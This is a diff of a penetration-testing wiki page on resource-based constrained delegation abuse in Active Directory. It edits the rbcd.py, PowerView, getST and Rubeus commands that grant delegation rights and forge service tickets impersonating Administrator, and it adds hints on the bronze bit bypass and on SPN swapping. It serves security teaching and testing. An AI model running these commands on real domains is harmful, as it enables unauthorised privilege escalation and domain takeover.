@@ -37,7 +37,7 @@ The `msDS-AllowedToActOnBehalfOfOtherIdentity` was introduced with Windows Serve
 rbcd.py -delegate-to 'target$' -dc-ip 'DomainController' -action read 'DOMAIN'/'POWERFULUSER':'PASSWORD'
 
 # Append value to the msDS-AllowedToActOnBehalfOfOtherIdentity
-rbcd.py -delegate-from 'accountwithSPN' -delegate-to 'target$' -dc-ip 'DomainController' -action write 'DOMAIN'/'POWERFULUSER':'PASSWORD'
+rbcd.py -delegate-from 'controlledaccountwithSPN' -delegate-to 'target$' -dc-ip 'DomainController' -action write 'DOMAIN'/'POWERFULUSER':'PASSWORD'
 ```
 
 {% hint style="success" %}
@@ -49,11 +49,11 @@ Testers can also use [ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blo
 Once the attribute has been modified, the [Impacket](https://github.com/SecureAuthCorp/impacket) script [getST](https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py) (Python) can then perform all the necessary steps to obtain the final "impersonating" ST (in this case, "Administrator" is impersonated but it can be any user in the environment).
 
 ```bash
-getST.py -spn $target_SPN -impersonate Administrator -dc-ip $DomainController 'DOMAIN/SHUTDOWN$:SomePassword'
+getST.py -spn "cifs/target" -impersonate Administrator -dc-ip $DomainController 'DOMAIN/controlledaccountwithSPN:SomePassword'
 ```
 
 {% hint style="warning" %}
-In [some cases](../delegations/#theory), the delegation will not work. Depending on the context, the [bronze bit ](../forged-tickets.md#bronze-bit-cve-2020-17049)vulnerability (CVE-2020-17049) can be used with the `-force-forwardable` option to try to bypass restrictions.
+In [some cases](./#theory), the delegation will not work. Depending on the context, the [bronze bit ](../forged-tickets.md#bronze-bit-cve-2020-17049)vulnerability (CVE-2020-17049) can be used with the `-force-forwardable` option to try to bypass restrictions.
 {% endhint %}
 
 {% hint style="info" %}
@@ -77,14 +77,14 @@ The [PowerShell ActiveDirectory module](https://docs.microsoft.com/en-us/powersh
 Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount
 
 # Populate the msDS-AllowedToActOnBehalfOfOtherIdentity
-Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount 'accountwithSPN'
+Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount 'controlledaccountwithSPN'
 ```
 
 PowerSploit's [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) module is an alternative that can be used to edit the attribute ([source](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html?highlight=genericall#id31)).
 
 ```bash
-# Obtain the SID of the controlled computer account
-$ComputerSid = Get-DomainComputer 'PENTEST01' -Properties objectsid | Select -Expand objectsid
+# Obtain the SID of the controlled account with SPN (e.g. Computer account)
+$ComputerSid = Get-DomainComputer "controlledaccountwithSPN" -Properties objectsid | Select -Expand objectsid
 
 # Build a generic ACE with the attacker-added computer SID as the pricipal, and get the binary bytes for the new DACL/ACE
 $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
@@ -92,19 +92,19 @@ $SDBytes = New-Object byte[] ($SD.BinaryLength)
 $SD.GetBinaryForm($SDBytes, 0)
 
 # set SD in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the target comptuer account
-Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+Get-DomainComputer "target$" | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
 ```
 
 **2 - Obtain a ticket (delegation operation)** :ticket: ****&#x20;
 
 [Rubeus](https://github.com/GhostPack/Rubeus) can then be used to request the TGT and "impersonation ST" and inject it for later use.
 
-```bash
+```powershell
 # Request the TGT
-Rubeus.exe tgtdeleg
+Rubeus.exe tgtdeleg /nowrap
 
-# Request the "impersonation" service ticket
-Rubeus.exe s4u /user:SHUTDOWN$ /rc4:$NThash /impersonateuser:Administrator /msdsspn:$Target_SPN /ptt
+# Request the "impersonation" service ticke
+Rubeus.exe s4u /nowrap /impersonateuser:"administrator" /msdsspn:"cifs/target" /domain:"domain" /user:"controlledaccountwithSPN" /rc4:$NThash
 ```
 
 The NT hash can be computed as follows.
@@ -112,6 +112,14 @@ The NT hash can be computed as follows.
 ```bash
 Rubeus.exe hash /password:$password
 ```
+
+{% hint style="warning" %}
+In [some cases](./#theory), the delegation will not work. Depending on the context, the [bronze bit ](../forged-tickets.md#bronze-bit-cve-2020-17049)vulnerability (CVE-2020-17049) can be used with the `/bronzebit` flag to try to bypass restrictions.
+{% endhint %}
+
+{% hint style="info" %}
+The SPN (Service Principal Name) set can have an impact on what services will be reachable. For instance, `cifs/target.domain` or `host/target.domain` will allow most remote dumping operations (more info on [adsecurity.org](https://adsecurity.org/?page\_id=183)). There however scenarios where the SPN can be changed ([AnySPN](../ptt.md#modifying-the-spn)) to access more service**s**. This technique can be exploited with the `/altservice` flag with Rubeus.
+{% endhint %}
 
 **3 - Pass-the-ticket** :passport\_control: ****&#x20;
 
